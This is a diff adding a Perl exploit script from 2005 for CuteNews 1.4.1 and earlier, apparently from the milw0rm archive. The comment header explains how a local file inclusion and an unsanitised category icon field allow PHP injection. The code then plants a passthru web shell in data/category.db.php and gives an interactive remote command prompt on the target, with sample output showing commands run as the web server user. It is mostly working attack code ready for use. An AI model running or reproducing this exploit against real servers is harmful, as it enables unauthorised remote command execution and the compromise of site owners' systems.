@@ -1,0 +1,163 @@
+#!/usr/bin/perl
+#
+# cijfer-cnxpl - CuteNews <=1.4.1 Remote Command Execution
+#
+# Copyright (c) 2005 cijfer <cijfer@netti.fi>
+# All rights reserved.           
+#
+## 1. example
+#
+# [cijfer@kalma:/research]$ ./cijfer-cnxpl.pl -h www.xxxx.org -d /news
+# [cijfer@www.xxxx.org /]$ id;uname -a
+# uid=48(apache) gid=48(apache) groups=48(apache),29000(web_serving) context=root:system_r:httpd_sys_script_t
+# Linux server.xxxx.org 2.6.13-1.1532_FC4 #1 Thu Oct 20 01:30:08 EDT 2005 i686 i686 i386 GNU/Linux
+# [cijfer@www.xxxx.org /]$
+#
+## 2. explanation
+#
+# this particular vulnerability is already known (sort of). a
+# bug as exact as this one was found by rgod in CuteNews. the
+# sole difference between his and my bug, are the files that
+# are being exploited. while his was a bug using the following
+# string:
+#
+#	show_archives.php?template=../inc/ipban.mdu%00
+#
+# i found my bug in:
+#
+#	show_archives.php?template=../inc/categories.mdu%00
+#
+## 3. the bug
+#
+# the bug lies in categories.mdu, located in the /inc/ folder
+# of the cutenews directory.
+#
+# by using the 'template' variable in show_archives.php, we
+# can include any local files. in this case, we're including
+# categories.mdu. why? every .mdu file within the cutenews 
+# package has raw PHP code within it, that is not protected
+# like the normal .php files.
+#
+# $template gets sanitized, but can be bypassed depending on
+# php configuration! this is why on some 1.4.0's it works and
+# on some others it does not. it all depends on configuration
+# and whether or not register_globals needs to be on.
+#
+# 	if(file_exists("$cutepath/data/${template}.tpl")){ require("$cutepath/data/${template}.tpl"); }
+#       ...
+#
+# looking into categories.mdu, we notice the following to
+# create our exploit string:
+#
+# 	if($member_db[1] != 1){ msg("error", "Access Denied", "You don't have permission to edit categories"); }
+#       ... 
+#
+#	elseif($action == "doedit")
+# 	{
+#       ...
+#
+# cannot write arbitrary php code to $cat_name :(
+#
+#	$cat_name = htmlspecialchars(stripslashes($cat_name)); 
+#       ...
+#
+# $cat_icon lacks sanitization :))!
+#
+#	fwrite($new_cats, "$catid|$cat_name|$cat_icon|||\n");
+#       ...
+#
+# adding together all these elements, it is possible to inject
+# php code into data/category.db.php and from there, use our
+# injected code to either include a remote php shell, or run
+# commands on the system.
+#
+##
+#
+# $Id: cijfer-cnxpl.pl,v 0.2 2005/12/26 03:36:00 cijfer Exp cijfer $
+
+use IO::Socket;
+use Getopt::Std;
+use URI::Escape;
+
+getopts("h:d:");
+
+$host = $opt_h;
+$dirs = $opt_d;
+$good = 0;
+
+if(!$host)
+{
+	print "cijfer-cnxpl.pl by cijfer\n";
+        print "usage: $0 -h <hostname> -d [/directory]\r\n";
+        exit();
+}
+
+while()
+{
+	print "[cijfer@".$host." /]\$ ";
+	while(<STDIN>)
+	{
+		$cmds=$_;
+		chomp($cmds);
+		last;
+	}
+
+if(!$dirs)
+{
+	$dirs = "/cutenews";
+}
+
+$string  = $dirs;
+$string .= "/show_archives.php?template=../inc/categories.mdu%00";
+$string .= "&member_db[1]=1";
+$string .= "&action=doedit";                                #can be changed from 'doedit' to 'add' if no categories exist
+$string .= "&cat_name=cijfer";
+$string .= "&catid=1";                                      #can be changed to different value if starting catid != 0
+$string .= "&cat_icon=%3C%3Fpassthru%28%24_GET%5Bcij%5D%29%3Bdie%28%29%3B%3F%3E";
+
+$cijfer  = $dirs;
+$cijfer .= "/data/category.db.php?cij=";
+$cijfer .= uri_escape("echo; ");
+$cijfer .= "%20%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20"; # _START_
+$cijfer .= uri_escape($cmds);
+$cijfer .= "%3B%20%65%63%68%6F%20%5F%45%4E%44%5F";          # _END_
+
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) || die "error: connect()\n";
+
+print $sock "GET $string HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Accept: */*\n";
+print $sock "Connection: close\n\n";
+
+$sock = IO::Socket::INET->new( Proto => "tcp", PeerAddr => $host, PeerPort => 80) || die "error: connect()\n";
+
+print $sock "GET $cijfer HTTP/1.1\n";
+print $sock "Host: $host\n";
+print $sock "Accept: */*\n";
+print $sock "Connection: close\n\n";
+
+while($result = <$sock>)
+{
+	if($sock =~ /^403/)
+	{
+		print "error: 403\n";
+		exit();
+	}
+	if($result =~ /^_END_/)
+	{
+		$good=0;
+	}
+
+	if($good==1)
+	{
+        	print $result;
+	}
+
+	if($result =~ /^_START_/)
+	{
+		$good=1;
+	}
+}
+}
+
+# milw0rm.com [2006-01-01]
